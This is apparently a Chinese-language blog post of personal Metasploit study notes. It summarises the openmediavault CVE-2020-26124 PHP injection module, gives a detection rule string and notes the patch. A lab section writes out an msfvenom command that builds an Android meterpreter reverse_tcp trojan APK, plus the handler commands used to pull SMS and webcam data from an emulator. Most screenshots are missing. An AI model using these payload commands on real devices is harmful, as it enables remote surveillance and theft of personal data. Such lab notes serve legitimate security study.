---
layout: post
title: metasploit工具了解
date: 2021-06-26 09:30
tags: 其他
excerpt: "本文介绍metasploit工具使用&学习笔记。"
toc: true
---	

## metasploit了解

更新至2020/11/23含有4125个exploits 1125个auxiliary 352个post 592个payloads 45个encoders 10 nops:10、 evasion:7

![](file:///C:/Users/zhukeyu/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg)

### CVE-2020-26124

造成漏洞原因：

4.1.36之前的openmediavault和5.5.12之前的5.x允许通过rpc.php的sortfield POST参数进行经过身份验证的PHP代码注入攻击，因为config / databasebackend.inc中未使用json_encode_safe。成功利用漏洞后，可以在根操作系统上以root用户身份执行任意命令。

![](file:///C:/Users/zhukeyu/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg)

1.     show options &set

![](file:///C:/Users/zhukeyu/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg)

2.     分析openmediacault_rpc_rce.rb文件

大概流程：1.check a.login()  post请求rpc.php文件

                 b.get_target() post请求version信息

                 b.execute_command() post请求数据中携带.exec(命令)

          2.exploit a.execute_cmdstager

3.使用，抓包分析，书写规则

![](file:///C:/Users/zhukeyu/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg)

执行成功。

![](file:///C:/Users/zhukeyu/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg)

规则中可以检测：

"sortfield":"'.exec(\"

4.查看补丁信息

添加了json_encode_safe()函数

![](file:///C:/Users/zhukeyu/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg)

### 3.1 metasploit_shellcode

### 3.2利用metasploit生成安卓木马

1. 生成木马

msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.159.224 lport=55555 R > zky.apk

![](file:///C:/Users/zhukeyu/AppData/Local/Temp/msohtmlclip1/01/clip_image016.jpg)

使用逍遥模拟器打开

![](file:///C:/Users/zhukeyu/AppData/Local/Temp/msohtmlclip1/01/clip_image018.jpg)

注意安装逍遥模拟器需要打开虚拟机虚拟化vt设置

![](file:///C:/Users/zhukeyu/AppData/Local/Temp/msohtmlclip1/01/clip_image020.jpg)

打开metasploit监听端口，运行MainActivity

![](file:///C:/Users/zhukeyu/AppData/Local/Temp/msohtmlclip1/01/clip_image022.jpg)

发送一个真正的apk到安卓模拟器，然后成功启动一个会话，利用这个会话获取基本信息以及短信等信息

![](file:///C:/Users/zhukeyu/AppData/Local/Temp/msohtmlclip1/01/clip_image024.jpg)

使用jadx-gui分析zky.apk文件，可以看到该应用具有一些敏感权限

![](file:///C:/Users/zhukeyu/AppData/Local/Temp/msohtmlclip1/01/clip_image026.jpg)

抓取流量分析：

发送的apk携带链接信息

![](file:///C:/Users/zhukeyu/AppData/Local/Temp/msohtmlclip1/01/clip_image028.jpg)

```
use exploit/multi/handler

set payload android/meterpreter/reverse_tcp

set lhost 192.168.159.224

set lport 55555

exploit

webcam_list
```

调试过程中涉及的脚本，之后如果遇到可以进行参考

![](file:///C:/Users/zhukeyu/AppData/Local/Temp/msohtmlclip1/01/clip_image030.jpg)
